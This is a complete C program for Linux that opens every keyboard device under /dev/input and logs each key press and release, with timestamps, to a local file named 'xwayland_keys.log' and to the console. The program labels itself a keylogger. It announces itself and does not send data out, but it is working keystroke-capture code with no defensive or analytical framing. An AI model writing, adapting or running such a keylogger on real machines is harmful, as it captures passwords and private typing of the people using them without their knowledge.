#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <poll.h>
#include <linux/input.h>
#include <sys/ioctl.h>

static volatile sig_atomic_t running = 1;

static void handle_signal(int sig) {
    (void)sig;
    running = 0;
}

static const char *key_name(unsigned short code) {
    static char buf[64];
    const char *s = NULL;
    switch (code) {
        #define K(x) case KEY_##x: s = #x; break;
        K(ESC) K(1) K(2) K(3) K(4) K(5) K(6) K(7) K(8) K(9) K(0) K(MINUS) K(EQUAL) K(BACKSPACE)
        K(TAB) K(Q) K(W) K(E) K(R) K(T) K(Y) K(U) K(I) K(O) K(P) K(LEFTBRACE) K(RIGHTBRACE) K(ENTER)
        K(CAPSLOCK) K(A) K(S) K(D) K(F) K(G) K(H) K(J) K(K) K(L) K(SEMICOLON) K(APOSTROPHE) K(GRAVE)
        K(LEFTSHIFT) K(BACKSLASH) K(Z) K(X) K(C) K(V) K(B) K(N) K(M) K(COMMA) K(DOT) K(SLASH) K(RIGHTSHIFT)
        K(LEFTCTRL) K(KPASTERISK) K(LEFTALT) K(SPACE) K(F1) K(F2) K(F3) K(F4) K(F5) K(F6) K(F7) K(F8) K(F9) K(F10)
        K(F11) K(F12) K(F13) K(F14) K(F15) K(F16) K(F17) K(F18) K(F19) K(F20)
        K(NUMLOCK) K(SCROLLLOCK) K(KP7) K(KP8) K(KP9) K(KPMINUS) K(KP4) K(KP5) K(KP6) K(KPPLUS) K(KP1) K(KP2) K(KP3) K(KP0) K(KPDOT)
        K(ZENKAKUHANKAKU) K(102ND) K(RO) K(KATAKANA) K(HIRAGANA) K(HENKAN) K(KATAKANAHIRAGANA) K(MUHENKAN)
        K(KPJPCOMMA) K(KPENTER) K(RIGHTCTRL) K(KPSLASH) K(SYSRQ) K(RIGHTALT) K(LINEFEED) K(HOME) K(UP) K(PAGEUP) K(LEFT)
        K(RIGHT) K(END) K(DOWN) K(PAGEDOWN) K(INSERT) K(DELETE) K(MACRO) K(MUTE) K(VOLUMEDOWN) K(VOLUMEUP) K(POWER)
        K(KPEQUAL) K(KPPLUSMINUS) K(PAUSE) K(KPCOMMA) K(HANGUEL) K(HANJA) K(YEN) K(LEFTMETA) K(RIGHTMETA) K(COMPOSE)
        K(STOP) K(AGAIN) K(PROPS) K(UNDO) K(FRONT) K(COPY) K(OPEN) K(PASTE) K(FIND) K(CUT) K(HELP) K(MENU) K(CALC) K(SETUP)
        K(SLEEP) K(WAKEUP) K(FILE) K(SENDFILE) K(DELETEFILE) K(XFER) K(PROG1) K(PROG2) K(WWW) K(MSDOS) K(COFFEE)
        K(DIRECTION) K(CYCLEWINDOWS) K(MAIL) K(BOOKMARKS) K(COMPUTER) K(BACK) K(FORWARD) K(CLOSECD) K(EJECTCD)
        K(EJECTCLOSECD) K(NEXTSONG) K(PLAYPAUSE) K(PREVIOUSSONG) K(STOPCD) K(RECORD) K(REWIND) K(PHONE) K(ISO)
        K(CONFIG) K(HOMEPAGE) K(REFRESH) K(EXIT) K(MOVE) K(EDIT) K(SCROLLUP) K(SCROLLDOWN) K(KPLEFTPAREN) K(KPRIGHTPAREN)
        K(NEW) K(REDO) K(DASHBOARD) K(MAX) K(SCALE) K(RFKILL) K(ALS_TOGGLE)
        #undef K
    }
    if (s) return s;
    snprintf(buf, sizeof(buf), "0x%x", code);
    return buf;
}

int main(int argc, char **argv) {
    const char *logpath = "xwayland_keys.log";
    if (argc >= 2) logpath = argv[1];

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    /* scan /dev/input/ for keyboards */
    DIR *dir = opendir("/dev/input");
    if (!dir) { perror("/dev/input"); return 1; }

    struct pollfd *pfds = NULL;
    int npfds = 0, cap = 0;

    struct dirent *de;
    while ((de = readdir(dir))) {
        if (strncmp(de->d_name, "event", 5) != 0) continue;
        char path[320];
        snprintf(path, sizeof(path), "/dev/input/%s", de->d_name);
        int fd = open(path, O_RDONLY|O_NONBLOCK);
        if (fd < 0) continue;

        /* check if it's a keyboard */
        unsigned char keybits[KEY_CNT/8] = {0};
        ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybits)), keybits);
        /* must have at least one letter key to be a keyboard */
        if (!(keybits[KEY_A/8] & (1 << (KEY_A%8))) &&
            !(keybits[KEY_1/8] & (1 << (KEY_1%8)))) {
            close(fd);
            continue;
        }

        char name[256] = {0};
        ioctl(fd, EVIOCGNAME(sizeof(name)), name);
        fprintf(stderr, "keyboard: %s (%s)\n", name, de->d_name);

        if (npfds >= cap) {
            cap = cap ? cap*2 : 8;
            pfds = realloc(pfds, sizeof(*pfds)*cap);
        }
        pfds[npfds].fd = fd;
        pfds[npfds].events = POLLIN;
        npfds++;
    }
    closedir(dir);

    if (npfds == 0) {
        fprintf(stderr, "error: no keyboards found. try: sudo adduser $USER input\n");
        return 1;
    }

    FILE *logfile = fopen(logpath, "a");
    if (!logfile) { perror("fopen"); return 1; }

    fprintf(stderr, "keylogger started (evdev) -> %s\n", logpath);
    fprintf(stderr, "Ctrl+C to stop.\n");

    while (running) {
        int ret = poll(pfds, npfds, 100);
        if (ret < 0) break;
        if (ret == 0) continue;

        for (int i = 0; i < npfds; i++) {
            if (!(pfds[i].revents & POLLIN)) continue;

            struct input_event ev;
            while (read(pfds[i].fd, &ev, sizeof(ev)) == (ssize_t)sizeof(ev)) {
                if (ev.type != EV_KEY) continue;
                if (ev.value != 0 && ev.value != 1) continue; /* skip kernel repeat */
                const char *act = ev.value ? "PRESS" : "RELEASE";
                const char *kn = key_name(ev.code);

                fprintf(logfile, "%lld.%06d %s %s\n",
                        (long long)ev.time.tv_sec, (int)ev.time.tv_usec, kn, act);
                fflush(logfile);
                printf("%lld.%06d %s %s\n",
                       (long long)ev.time.tv_sec, (int)ev.time.tv_usec, kn, act);
                fflush(stdout);
            }
        }
    }

    fclose(logfile);
    for (int i = 0; i < npfds; i++) close(pfds[i].fd);
    free(pfds);
    fprintf(stderr, "stopped.\n");
    return 0;
}
